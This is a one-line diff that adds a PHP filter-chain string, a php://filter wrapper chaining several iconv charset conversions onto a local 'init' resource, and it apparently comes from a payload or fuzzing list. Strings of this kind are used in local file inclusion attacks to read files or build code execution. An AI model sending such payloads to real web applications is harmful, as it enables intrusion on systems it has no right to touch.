@@ -1,0 +1,1 @@
+php://filter/convert.iconv.EUC-CN.CP1025|convert.iconv.CP866.EUC-CN|convert.iconv.IBM1154.BIG-5/resource=./init
